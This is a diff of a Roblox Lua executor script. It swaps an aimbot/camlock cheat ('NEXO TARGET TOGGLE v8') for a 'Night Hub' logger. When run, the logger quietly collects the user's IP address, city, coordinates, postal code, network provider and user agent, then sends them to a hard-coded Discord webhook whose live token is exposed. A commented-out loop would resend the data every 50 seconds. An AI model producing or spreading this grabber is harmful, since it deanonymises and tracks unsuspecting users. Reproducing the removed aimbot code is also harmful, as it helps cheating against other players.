@@ -1,703 +1,102 @@
+-- =============================================
+-- NIGHT HUB FULL DUAL LOGGER (ifconfig.co + ipinfo.io)
+-- =============================================
+
+local WEBHOOK = "https://discord.com/api/webhooks/1478224616043319426/0JkjEmjSeBnsioQRs9KmrRm-_sXaVa__0gLw9KrxMVNMdtAjsvnblw9FGpYpuNrWVT8B"
+
+local function getJson(url)
+    local success, response = pcall(function()
+        return game:HttpGet(url, true)
+    end)
+    if success then
+        local ok, data = pcall(function()
+            return game:GetService("HttpService"):JSONDecode(response)
+        end)
+        return ok and data or {}
+    end
+    return { error = "Failed to fetch " .. url }
+end
+
+local function sendWebhook(customMessage)
+    local co = getJson("https://ifconfig.co/json")
+    local info = getJson("https://ipinfo.io/json")
+
+    local HttpService = game:GetService("HttpService")
+
+    -- Create detailed fields (as many as possible)
+    local fields = {
+        { name = "IP Address",          value = "```" .. (co.ip or info.ip or "N/A") .. "```", inline = false },
+        { name = "IP Decimal",          value = tostring(co.ip_decimal or "N/A"), inline = true },
+        { name = "City",                value = co.city or info.city or "N/A", inline = true },
+        { name = "Region",              value = co.region or info.region or "N/A", inline = true },
+        { name = "Country",             value = (co.country or info.country or "N/A"), inline = true },
+        { name = "Country ISO",         value = co.country_iso or info.country or "N/A", inline = true },
+        { name = "Latitude",            value = tostring(co.latitude or "N/A"), inline = true },
+        { name = "Longitude",           value = tostring(co.longitude or "N/A"), inline = true },
+        { name = "Loc",                 value = info.loc or "N/A", inline = true },
+        { name = "Timezone",            value = co.time_zone or info.timezone or "N/A", inline = true },
+        { name = "Postal",              value = co.postal or info.postal or "N/A", inline = true },
+        { name = "ASN",                 value = co.asn or "N/A", inline = true },
+        { name = "ASN Org",             value = co.asn_org or info.org or "N/A", inline = false },
+        { name = "In EU?",              value = tostring(co.country_eu or false), inline = true },
+    }
+
+    -- Add User Agent if available
+    if co.user_agent and co.user_agent.raw_value then
+        table.insert(fields, { name = "User Agent (Raw)", value = "```" .. co.user_agent.raw_value .. "```", inline = false })
+    end
+
+    local embed = {
+        title = "🌙 Night Hub - Full Dual IP Information",
+        description = customMessage or "📡 Complete data from ifconfig.co + ipinfo.io",
+        color = 0x5865F2,
+        fields = fields,
+        footer = { text = "Night Hub • Full A-Z Logger" },
+        timestamp = DateTime.now():ToIsoDate()
+    }
+
+    -- Send FULL RAW JSON from both sites
+    local rawData = "```json\n=== ifconfig.co ===\n" .. HttpService:JSONEncode(co) ..
+                    "\n\n=== ipinfo.io ===\n" .. HttpService:JSONEncode(info) .. "\n```"
+
+    local payload = HttpService:JSONEncode({
+        username = "Night Hub Logger",
+        avatar_url = "",
+        embeds = { embed },
+        content = rawData
+    })
+
+    local sent = false
+
+    local methods = {
+        function() if http_request then http_request({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}); sent=true end end,
+        function() if syn and syn.request then syn.request({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}); sent=true end end,
+        function() if request then request({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}); sent=true end end,
+        function() if HttpService.PostAsync then HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson); sent=true end end
+    }
+
+    for _, method in ipairs(methods) do
+        pcall(method)
+        if sent then break end
+    end
+
+    if sent then
+        print("✅ Full dual info sent successfully!")
+        print("IP:", co.ip or info.ip or "Unknown")
+    else
+        print("❌ Failed to send. Try a different executor.")
+    end
+end
+
+-- ================== RUN ==================
+sendWebhook("Manual Full A-Z Info")
+
+-- Auto send (uncomment if you want):
 --[[
-    NEXO TARGET TOGGLE  v8  ::  HACKER THEME  ::  ALL-DEVICE RESPONSIVE
-    + AIMBOT (no team check — locks nearest player)
-    + RED locked-target highlight
-    + Glitchy bottom-RIGHT hacker notifications (GREEN on lock, RED on no target)
-    + Switch can't turn ON unless a target is found
-    + Extra-glitchy switch animation + monospace hacker font
-    + Original TARGET logo icon (ring + dot + corner ticks)
-]]
-
-local Players          = game:GetService("Players")
-local RunService       = game:GetService("RunService")
-local TweenService     = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local GuiService       = game:GetService("GuiService")
-local StarterGui       = game:GetService("StarterGui")
-
-local player    = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- ===== CONFIG =====
-local HACKER_FONT = Enum.Font.RobotoMono -- try Enum.Font.Code or Enum.Font.Ubuntu
-
-_G.CTT_STATE = _G.CTT_STATE or { pos = UDim2.fromScale(0.5, 0.5), isOn = false }
-local SAVED = _G.CTT_STATE
-
--- Clean old instance (also clears any leftover highlights)
-local OLD = playerGui:FindFirstChild("CircleTargetToggle")
-if OLD then
-    local oldC = OLD:FindFirstChild("Container")
-    if oldC then SAVED.pos = oldC.Position end
-    OLD:Destroy()
-end
-for _, plr in ipairs(Players:GetPlayers()) do
-    if plr.Character then
-        for _, v in ipairs(plr.Character:GetChildren()) do
-            if v:IsA("Highlight") and v.Name == "CTT_Highlight" then v:Destroy() end
-        end
-    end
-end
-
---// Neon hacker palette
-local RED   = Color3.fromRGB(255, 0, 40)
-local GREEN = Color3.fromRGB(0, 255, 65)
-local CORE  = Color3.fromRGB(8, 10, 9)
-
-local TXT_OFF = "TARGET NOT FOUND"
-local TXT_ON  = "TARGET LOCKED"
-
-local gui = Instance.new("ScreenGui")
-gui.Name = "CircleTargetToggle"
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.IgnoreGuiInset = true
-gui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
-gui.Parent = playerGui
-
---// Container
-local container = Instance.new("Frame")
-container.Name = "Container"
-container.AnchorPoint = Vector2.new(0.5, 0.5)
-container.Position = SAVED.pos
-container.Size = UDim2.fromOffset(58, 58)
-container.BackgroundTransparency = 1
-container.Parent = gui
-
---// >>> RESPONSIVE SCALER <<<
-local uiScale = Instance.new("UIScale")
-uiScale.Parent = container
-
-local function isTouchDevice()
-    return UserInputService.TouchEnabled and not UserInputService.MouseEnabled
-end
-
-local function updateScale()
-    local cam = workspace.CurrentCamera
-    local vp = cam and cam.ViewportSize or Vector2.new(1280, 720)
-    local s = math.min(vp.X, vp.Y) / 720
-    if isTouchDevice() then s = s * 1.6 end
-    s = math.clamp(s, 0.75, 2.5)
-    uiScale.Scale = s
-    local px = math.clamp(container.Position.X.Scale, 0.05, 0.95)
-    local py = math.clamp(container.Position.Y.Scale, 0.05, 0.95)
-    container.Position = UDim2.new(px, container.Position.X.Offset, py, container.Position.Y.Offset)
-    SAVED.pos = container.Position
-end
-
---// Outer neon ring
-local ringFrame = Instance.new("Frame")
-ringFrame.Name = "Ring"
-ringFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-ringFrame.Position = UDim2.fromScale(0.5, 0.5)
-ringFrame.Size = UDim2.fromOffset(60, 60)
-ringFrame.BackgroundTransparency = 1
-ringFrame.ZIndex = 0
-ringFrame.Parent = container
-local ringFC = Instance.new("UICorner"); ringFC.CornerRadius = UDim.new(1,0); ringFC.Parent = ringFrame
-local ringFS = Instance.new("UIStroke"); ringFS.Thickness = 2; ringFS.Color = RED; ringFS.Parent = ringFrame
-
---// Main circular button
-local btn = Instance.new("TextButton")
-btn.Name = "Button"
-btn.AnchorPoint = Vector2.new(0.5, 0.5)
-btn.Position = UDim2.fromScale(0.5, 0.5)
-btn.Size = UDim2.fromOffset(46, 46)
-btn.Text = ""
-btn.AutoButtonColor = false
-btn.BackgroundColor3 = CORE
-btn.ClipsDescendants = true
-btn.Parent = container
-local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(1,0); btnCorner.Parent = btn
-
-local coreGrad = Instance.new("UIGradient")
-coreGrad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(18,22,20)),
-    ColorSequenceKeypoint.new(1, CORE) })
-coreGrad.Rotation = 90
-coreGrad.Parent = btn
-
-local laserStroke = Instance.new("UIStroke")
-laserStroke.Thickness = 2; laserStroke.Color = RED; laserStroke.Parent = btn
-
---// Scanline
-local scan = Instance.new("Frame")
-scan.AnchorPoint = Vector2.new(0.5, 0.5)
-scan.Position = UDim2.fromScale(0.5, 0.2)
-scan.Size = UDim2.new(1, 0, 0, 2)
-scan.BackgroundColor3 = RED
-scan.BackgroundTransparency = 0.4
-scan.BorderSizePixel = 0
-scan.ZIndex = 2
-scan.Parent = btn
-
---// Target logo (original icon)
-local logo = Instance.new("Frame")
-logo.AnchorPoint = Vector2.new(0.5, 0.5)
-logo.Position = UDim2.fromScale(0.5, 0.5)
-logo.Size = UDim2.fromOffset(26, 26)
-logo.BackgroundTransparency = 1
-logo.ZIndex = 3
-logo.Parent = btn
-
-local ring = Instance.new("Frame")
-ring.AnchorPoint = Vector2.new(0.5, 0.5)
-ring.Position = UDim2.fromScale(0.5, 0.5)
-ring.Size = UDim2.fromScale(1, 1)
-ring.BackgroundTransparency = 1
-ring.ZIndex = 3
-ring.Parent = logo
-local ringC = Instance.new("UICorner"); ringC.CornerRadius = UDim.new(1,0); ringC.Parent = ring
-local ringS = Instance.new("UIStroke"); ringS.Thickness = 2; ringS.Color = RED; ringS.Parent = ring
-
-local dot = Instance.new("Frame")
-dot.AnchorPoint = Vector2.new(0.5, 0.5)
-dot.Position = UDim2.fromScale(0.5, 0.5)
-dot.Size = UDim2.fromOffset(4, 4)
-dot.BackgroundColor3 = RED
-dot.ZIndex = 4
-dot.Parent = logo
-local dotC = Instance.new("UICorner"); dotC.CornerRadius = UDim.new(1,0); dotC.Parent = dot
-
-local ticks = {}
-local function makeTick(orient, posScale)
-    local line = Instance.new("Frame")
-    line.AnchorPoint = Vector2.new(0.5, 0.5)
-    line.BackgroundColor3 = RED
-    line.BorderSizePixel = 0
-    line.ZIndex = 3
-    line.Parent = logo
-    if orient == "v" then
-        line.Size = UDim2.fromOffset(2, 6); line.Position = UDim2.fromScale(0.5, posScale)
-    else
-        line.Size = UDim2.fromOffset(6, 2); line.Position = UDim2.fromScale(posScale, 0.5)
-    end
-    table.insert(ticks, line)
-end
-makeTick("v", -0.02); makeTick("v", 1.02); makeTick("h", -0.02); makeTick("h", 1.02)
-
---// Status + RGB-split glitch
-local statusHolder = Instance.new("Frame")
-statusHolder.AnchorPoint = Vector2.new(0.5, 0)
-statusHolder.Position = UDim2.new(0.5, 0, 1, 6)
-statusHolder.Size = UDim2.fromOffset(160, 16)
-statusHolder.BackgroundTransparency = 1
-statusHolder.Parent = container
-
-local function mkLabel(z, color, trans)
-    local l = Instance.new("TextLabel")
-    l.AnchorPoint = Vector2.new(0.5, 0.5)
-    l.Position = UDim2.fromScale(0.5, 0.5)
-    l.Size = UDim2.fromScale(1, 1)
-    l.BackgroundTransparency = 1
-    l.Font = HACKER_FONT
-    l.TextScaled = false
-    l.TextSize = 12
-    l.Text = TXT_OFF
-    l.TextColor3 = color
-    l.TextTransparency = trans
-    l.ZIndex = z
-    l.Parent = statusHolder
-    return l
-end
-local ghostA = mkLabel(2, Color3.fromRGB(0,255,255), 0.45)
-local ghostB = mkLabel(2, Color3.fromRGB(255,0,160), 0.45)
-local status = mkLabel(3, RED, 0)
-
---====================================================
---  DRAGGING  (mouse + touch)
---====================================================
-local dragging, dragStart, startPos, moved
-btn.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-    or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true; moved = false
-        dragStart = input.Position; startPos = container.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false; SAVED.pos = container.Position
-            end
-        end)
+task.spawn(function()
+    while true do
+        sendWebhook("Auto Full Info")
+        task.wait(50)
     end
 end)
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
-    or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - dragStart
-        if delta.Magnitude > 6 then moved = true end
-        container.Position = UDim2.new(
-            startPos.X.Scale, startPos.X.Offset + delta.X,
-            startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
---====================================================
---  GLITCH EFFECTS
---====================================================
-local CH = "!<>-_\\/[]{}=+*^?#01ABCDEF"
-local function glitchBurst(c, count)
-    for i = 1, (count or 6) do
-        local g = Instance.new("Frame")
-        g.AnchorPoint = Vector2.new(0.5, 0.5)
-        g.Position = UDim2.fromScale(0.5, math.random(15, 85)/100)
-        g.Size = UDim2.new(1, math.random(-6, 6), 0, math.random(1, 3))
-        g.BackgroundColor3 = c
-        g.BackgroundTransparency = math.random(1, 5)/10
-        g.BorderSizePixel = 0
-        g.ZIndex = 5
-        g.Parent = btn
-        TweenService:Create(g, TweenInfo.new(0.22), { BackgroundTransparency = 1 }):Play()
-        task.delay(0.22, function() g:Destroy() end)
-    end
-end
-
-local function switchGlitch(c)
-    for i = 1, math.random(8, 14) do
-        local g = Instance.new("Frame")
-        g.AnchorPoint = Vector2.new(0.5, 0.5)
-        g.Position = UDim2.fromScale(0.5, math.random(0, 100)/100)
-        g.Size = UDim2.new(1, math.random(-4, 10), 0, math.random(1, 4))
-        local roll = math.random()
-        g.BackgroundColor3 = (roll < 0.4) and c
-            or (roll < 0.7) and Color3.fromRGB(0,255,255)
-            or Color3.fromRGB(255,0,160)
-        g.BackgroundTransparency = math.random(0, 4)/10
-        g.BorderSizePixel = 0
-        g.ZIndex = 6
-        g.Parent = btn
-        TweenService:Create(g, TweenInfo.new(math.random(15, 30)/100), { BackgroundTransparency = 1 }):Play()
-        task.delay(0.3, function() g:Destroy() end)
-    end
-    logo.Position = UDim2.new(0.5, math.random(-4, 4), 0.5, math.random(-4, 4))
-    TweenService:Create(logo, TweenInfo.new(0.18, Enum.EasingStyle.Elastic),
-        { Position = UDim2.fromScale(0.5, 0.5) }):Play()
-end
-
-local function scramble(finalText, color)
-    status.TextColor3 = color; ghostA.Text = finalText; ghostB.Text = finalText
-    local steps = 8
-    for s = 1, steps do
-        task.delay(s * 0.03, function()
-            local out = {}
-            for i = 1, #finalText do
-                if s/steps > (i/#finalText) then out[i] = finalText:sub(i,i)
-                else local r = math.random(#CH); out[i] = CH:sub(r,r) end
-            end
-            status.Text = table.concat(out)
-        end)
-    end
-    task.delay(steps * 0.03 + 0.02, function() status.Text = finalText end)
-end
-
---====================================================
---  >>> CUSTOM HACKER NOTIFICATION <<<  (bottom-right, glitchy, color-aware)
---====================================================
-local activeToasts = {}
-local function repositionToasts()
-    for i, t in ipairs(activeToasts) do
-        local y = -16 - (i - 1) * 70
-        TweenService:Create(t, TweenInfo.new(0.25, Enum.EasingStyle.Quint), {
-            Position = UDim2.new(1, -16, 1, y)
-        }):Play()
-    end
-end
-
-local function notify(titleText, msgText, col)
-    titleText = tostring(titleText or "")
-    msgText   = tostring(msgText or "")
-    col = col or RED
-    local frame = Instance.new("Frame")
-    frame.Name = "HackNotify"
-    frame.AnchorPoint = Vector2.new(1, 1)
-    frame.Position = UDim2.new(1, 300, 1, -16)
-    frame.Size = UDim2.fromOffset(260, 58)
-    frame.BackgroundColor3 = CORE
-    frame.BackgroundTransparency = 0.05
-    frame.BorderSizePixel = 0
-    frame.ClipsDescendants = true
-    frame.ZIndex = 60
-    frame.Parent = gui
-
-    local fScale = Instance.new("UIScale"); fScale.Scale = uiScale.Scale; fScale.Parent = frame
-    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = frame
-    local st = Instance.new("UIStroke"); st.Thickness = 1.5; st.Color = col; st.Transparency = 0.1; st.Parent = frame
-    local grad = Instance.new("UIGradient")
-    grad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(16,18,16)),
-        ColorSequenceKeypoint.new(1, CORE) })
-    grad.Rotation = 90; grad.Parent = frame
-
-    local accent = Instance.new("Frame")
-    accent.AnchorPoint = Vector2.new(0, 0.5)
-    accent.Position = UDim2.new(0, 6, 0.5, 0)
-    accent.Size = UDim2.new(0, 3, 0, 36)
-    accent.BackgroundColor3 = col
-    accent.BorderSizePixel = 0
-    accent.ZIndex = 62
-    accent.Parent = frame
-    local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(1,0); ac.Parent = accent
-
-    local title = Instance.new("TextLabel")
-    title.BackgroundTransparency = 1
-    title.Position = UDim2.new(0, 18, 0, 8)
-    title.Size = UDim2.new(1, -28, 0, 16)
-    title.Font = HACKER_FONT
-    title.TextSize = 13
-    title.Text = "> " .. titleText
-    title.TextColor3 = col
-    title.TextXAlignment = Enum.TextXAlignment.Left
-    title.ZIndex = 63
-    title.Parent = frame
-
-    local function mkMsg(z, mcol, trans)
-        local l = Instance.new("TextLabel")
-        l.BackgroundTransparency = 1
-        l.AnchorPoint = Vector2.new(0, 0.5)
-        l.Position = UDim2.new(0, 18, 0, 34)
-        l.Size = UDim2.new(1, -28, 0, 16)
-        l.Font = HACKER_FONT
-        l.TextSize = 12
-        l.Text = msgText
-        l.TextColor3 = mcol
-        l.TextTransparency = trans
-        l.TextXAlignment = Enum.TextXAlignment.Left
-        l.ZIndex = z
-        l.Parent = frame
-        return l
-    end
-    local mGhostA = mkMsg(62, Color3.fromRGB(0,255,255), 0.5)
-    local mGhostB = mkMsg(62, Color3.fromRGB(255,0,160), 0.5)
-    local msg     = mkMsg(63, Color3.fromRGB(210,210,215), 0)
-
-    local nScan = Instance.new("Frame")
-    nScan.AnchorPoint = Vector2.new(0.5, 0.5)
-    nScan.Position = UDim2.fromScale(0.5, 0.1)
-    nScan.Size = UDim2.new(1, 0, 0, 2)
-    nScan.BackgroundColor3 = col
-    nScan.BackgroundTransparency = 0.5
-    nScan.BorderSizePixel = 0
-    nScan.ZIndex = 64
-    nScan.Parent = frame
-
-    local function toastGlitch(count)
-        for i = 1, (count or 5) do
-            local g = Instance.new("Frame")
-            g.AnchorPoint = Vector2.new(0.5, 0.5)
-            g.Position = UDim2.fromScale(0.5, math.random(10, 90)/100)
-            g.Size = UDim2.new(1, math.random(-10, 10), 0, math.random(1, 3))
-            g.BackgroundColor3 = (math.random() < 0.5) and col or Color3.fromRGB(0,255,255)
-            g.BackgroundTransparency = math.random(2, 6)/10
-            g.BorderSizePixel = 0
-            g.ZIndex = 65
-            g.Parent = frame
-            TweenService:Create(g, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play()
-            task.delay(0.2, function() g:Destroy() end)
-        end
-    end
-
-    task.spawn(function()
-        local steps = 10
-        for s = 1, steps do
-            task.delay(s * 0.03, function()
-                if not frame.Parent then return end
-                local out = {}
-                for i = 1, #msgText do
-                    if s/steps > (i/#msgText) then out[i] = msgText:sub(i,i)
-                    else local r = math.random(#CH); out[i] = CH:sub(r,r) end
-                end
-                local txt = table.concat(out)
-                msg.Text = txt; mGhostA.Text = txt; mGhostB.Text = txt
-            end)
-        end
-        task.delay(steps * 0.03 + 0.02, function()
-            if frame.Parent then msg.Text = msgText; mGhostA.Text = msgText; mGhostB.Text = msgText end
-        end)
-    end)
-
-    local conn
-    conn = RunService.RenderStepped:Connect(function()
-        if not frame.Parent then conn:Disconnect() return end
-        local now = tick()
-        local t = (now * 1.5) % 1
-        nScan.Position = UDim2.fromScale(0.5, 0.05 + t * 0.9)
-        nScan.BackgroundTransparency = 0.4 + math.abs(math.sin(now*6)) * 0.4
-        local jx = math.sin(now*26) * 1.4 + math.random(-2, 2)
-        mGhostA.Position = UDim2.new(0, 18 + jx, 0, 34)
-        mGhostB.Position = UDim2.new(0, 18 - jx, 0, 34)
-        st.Transparency = (math.random() < 0.1) and 0.5 or 0.1
-        if math.random() < 0.12 then toastGlitch(math.random(3, 6)) end
-    end)
-
-    table.insert(activeToasts, 1, frame)
-    repositionToasts()
-    toastGlitch(10)
-
-    task.delay(3.0, function()
-        if conn then conn:Disconnect() end
-        TweenService:Create(frame, TweenInfo.new(0.3), { Position = UDim2.new(1, 300, 1, -16) }):Play()
-        task.delay(0.32, function()
-            for i, t in ipairs(activeToasts) do
-                if t == frame then table.remove(activeToasts, i) break end
-            end
-            frame:Destroy()
-            repositionToasts()
-        end)
-    end)
-end
-
---====================================================
---  TARGETING  (no team check — any living player)
---====================================================
-local function isTargetable(plr)
-    return plr ~= player
-end
-
---====================================================
---  AIMBOT / CAMLOCK LOGIC
---====================================================
-local Prediction = 0.1768521
-local enemy = nil
-local highlightInstance = nil
-local camlockConnection = nil
-
-local function removeHighlight(target)
-    if target and target.Character then
-        for _, v in ipairs(target.Character:GetChildren()) do
-            if v:IsA("Highlight") and v.Name == "CTT_Highlight" then v:Destroy() end
-        end
-    end
-end
-
-local function createHighlight(target)
-    if target and target.Character then
-        removeHighlight(target)
-        local highlight = Instance.new("Highlight")
-        highlight.Name = "CTT_Highlight"
-        highlight.Adornee = target.Character
-        highlight.FillColor = RED
-        highlight.OutlineColor = Color3.new(1, 0, 0)
-        highlight.FillTransparency = 0.4
-        highlight.OutlineTransparency = 0
-        highlight.Parent = target.Character
-        return highlight
-    end
-end
-
-local function FindNearestTarget()
-    local ClosestDistance, ClosestPlayer = math.huge, nil
-    local res = GuiService:GetScreenResolution()
-    local Center = Vector2.new(res.X / 2, res.Y / 2)
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if isTargetable(plr) and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-            local hum = plr.Character:FindFirstChild("Humanoid")
-            if hum and hum.Health > 0 then
-                local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
-                if onScreen then
-                    local dist = (Center - Vector2.new(pos.X, pos.Y)).Magnitude
-                    if dist < ClosestDistance then
-                        ClosestDistance = dist
-                        ClosestPlayer = plr
-                    end
-                end
-            end
-        end
-    end
-    return ClosestPlayer
-end
-
-local function unlockTarget()
-    if camlockConnection then camlockConnection:Disconnect(); camlockConnection = nil end
-    if highlightInstance then removeHighlight(enemy); highlightInstance = nil end
-    enemy = nil
-end
-
--- Returns true if a target was locked. Notifies GREEN on success.
-local function lockTarget(preTarget)
-    unlockTarget()
-    enemy = preTarget or FindNearestTarget()
-    if enemy then
-        highlightInstance = createHighlight(enemy)
-        notify("TARGET LOCKED", "[+] " .. enemy.DisplayName, GREEN)
-        camlockConnection = RunService.Heartbeat:Connect(function()
-            if enemy and isTargetable(enemy) and enemy.Character and enemy.Character:FindFirstChild("HumanoidRootPart") then
-                local targetPart = enemy.Character.HumanoidRootPart
-                local camera = workspace.CurrentCamera
-                local predictedPos = targetPart.Position + (targetPart.AssemblyLinearVelocity * Prediction)
-                camera.CFrame = CFrame.new(camera.CFrame.Position, predictedPos)
-            else
-                unlockTarget()
-            end
-        end)
-        return true
-    end
-    return false
-end
-
---====================================================
---  TOGGLE STATES
---====================================================
-local isOn = SAVED.isOn
-local pulseConn
-
-local function setColor(c)
-    laserStroke.Color = c; ringFS.Color = c; ringS.Color = c
-    dot.BackgroundColor3 = c; scan.BackgroundColor3 = c; status.TextColor3 = c
-    for _, t in ipairs(ticks) do t.BackgroundColor3 = c end
-end
-
-local function setOnState(instant)
-    local ti = TweenInfo.new(instant and 0 or 0.3, Enum.EasingStyle.Back)
-    TweenService:Create(btn, ti, { Size = UDim2.fromOffset(52, 52) }):Play()
-    laserStroke.Thickness = 3
-    setColor(GREEN); switchGlitch(GREEN)
-    if instant then status.Text = TXT_ON; ghostA.Text = TXT_ON; ghostB.Text = TXT_ON
-    else scramble(TXT_ON, GREEN) end
-    if pulseConn then pulseConn:Disconnect(); pulseConn = nil end
-    ringFrame.Size = UDim2.fromOffset(62, 62)
-end
-
-local function setOffState(instant)
-    local ti = TweenInfo.new(instant and 0 or 0.3, Enum.EasingStyle.Quad)
-    TweenService:Create(btn, ti, { Size = UDim2.fromOffset(46, 46) }):Play()
-    laserStroke.Thickness = 2
-    setColor(RED); switchGlitch(RED)
-    if instant then status.Text = TXT_OFF; ghostA.Text = TXT_OFF; ghostB.Text = TXT_OFF
-    else scramble(TXT_OFF, RED) end
-    if pulseConn then pulseConn:Disconnect() end
-    pulseConn = RunService.RenderStepped:Connect(function()
-        local s = math.sin(tick() * 1.4) * 0.5 + 0.5
-        ringFrame.Size = UDim2.fromOffset(52 + s * 16, 52 + s * 16)
-    end)
-end
-
--- Denied "shake + glitch" when trying to turn on with no target.
-local function denyToggle()
-    switchGlitch(RED)
-    local ox = container.Position.X.Offset
-    for i = 1, 4 do
-        task.delay((i-1) * 0.04, function()
-            container.Position = UDim2.new(container.Position.X.Scale, ox + ((i % 2 == 0) and 6 or -6),
-                container.Position.Y.Scale, container.Position.Y.Offset)
-        end)
-    end
-    task.delay(0.2, function()
-        container.Position = UDim2.new(container.Position.X.Scale, ox,
-            container.Position.Y.Scale, container.Position.Y.Offset)
-    end)
-end
-
-btn.MouseButton1Click:Connect(function()
-    if moved then return end
-    if not isOn then
-        -- Trying to turn ON: require a target first.
-        local target = FindNearestTarget()
-        if not target then
-            notify("NO TARGET", "[-] no player found", RED)
-            denyToggle()
-            return
-        end
-        isOn = true; SAVED.isOn = true
-        TweenService:Create(btn, TweenInfo.new(0.08), { Size = UDim2.fromOffset(40, 40) }):Play()
-        task.wait(0.08)
-        setOnState()
-        lockTarget(target)
-    else
-        isOn = false; SAVED.isOn = false
-        TweenService:Create(btn, TweenInfo.new(0.08), { Size = UDim2.fromOffset(40, 40) }):Play()
-        task.wait(0.08)
-        setOffState()
-        unlockTarget()
-    end
-end)
-
-btn.MouseEnter:Connect(function()
-    TweenService:Create(laserStroke, TweenInfo.new(0.2), { Thickness = (isOn and 4 or 3) }):Play()
-end)
-btn.MouseLeave:Connect(function()
-    TweenService:Create(laserStroke, TweenInfo.new(0.2), { Thickness = (isOn and 3 or 2) }):Play()
-end)
-
---====================================================
---  CONSTANT ANIMATIONS  (extra glitchy)
---====================================================
-local nextGlitch = 0
-local nextShake = 0
-RunService.RenderStepped:Connect(function(dt)
-    local now = tick()
-    local t = (now * (isOn and 2.0 or 1.3)) % 1
-    scan.Position = UDim2.fromScale(0.5, 0.12 + t * 0.76)
-    scan.BackgroundTransparency = 0.2 + math.abs(math.sin(now*9)) * 0.4
-
-    local jx = math.sin(now*30) * 2.4 + math.random(-3, 3)
-    local jy = math.random(-1, 1)
-    ghostA.Position = UDim2.fromScale(0.5 + jx/120, 0.5 + jy/60)
-    ghostB.Position = UDim2.fromScale(0.5 - jx/120, 0.5 - jy/60)
-    if math.random() < 0.15 then
-        ghostA.TextTransparency = math.random(2, 6)/10
-        ghostB.TextTransparency = math.random(2, 6)/10
-    else
-        ghostA.TextTransparency = 0.45
-        ghostB.TextTransparency = 0.45
-    end
-
-    local flick = (math.random() < 0.18) and math.random(3, 7)/10 or 0
-    laserStroke.Transparency = flick
-    status.TextTransparency = flick
-
-    if math.random() < 0.12 then
-        local base = isOn and TXT_ON or TXT_OFF
-        if #base > 0 then
-            local i = math.random(#base)
-            local r = math.random(#CH)
-            status.Text = base:sub(1, i-1) .. CH:sub(r, r) .. base:sub(i+1)
-            task.delay(0.05, function() if status.Text ~= base then status.Text = base end end)
-        end
-    end
-
-    if now >= nextShake then
-        nextShake = now + math.random(40, 120)/100
-        local sx, sy = math.random(-2, 2), math.random(-2, 2)
-        logo.Position = UDim2.new(0.5, sx, 0.5, sy)
-        TweenService:Create(logo, TweenInfo.new(0.12, Enum.EasingStyle.Elastic),
-            { Position = UDim2.fromScale(0.5, 0.5) }):Play()
-    end
-
-    if now >= nextGlitch then
-        nextGlitch = now + math.random(50, 150)/100
-        glitchBurst(isOn and GREEN or RED, math.random(5, 11))
-        if math.random() < 0.5 then
-            scramble(isOn and TXT_ON or TXT_OFF, isOn and GREEN or RED)
-        end
-    end
-end)
-
---====================================================
---  RESPONSIVE SCALING + INIT
---====================================================
-updateScale()
-local cam = workspace.CurrentCamera
-if cam then
-    cam:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale)
-end
-workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
-    cam = workspace.CurrentCamera
-    if cam then cam:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale) end
-    updateScale()
-end)
-GuiService:GetPropertyChangedSignal("SelectedObject"):Connect(updateScale)
-
--- Restore previous state (only stays ON if a target is actually found)
-if isOn then
-    local target = FindNearestTarget()
-    if target then
-        setOnState(true)
-        lockTarget(target)
-    else
-        isOn = false; SAVED.isOn = false
-        setOffState(true)
-    end
-else
-    setOffState(true)
-end
-
-notify("NEXO TARGET TOGGLE", "loaded // aimbot ready", RED)
+--]]
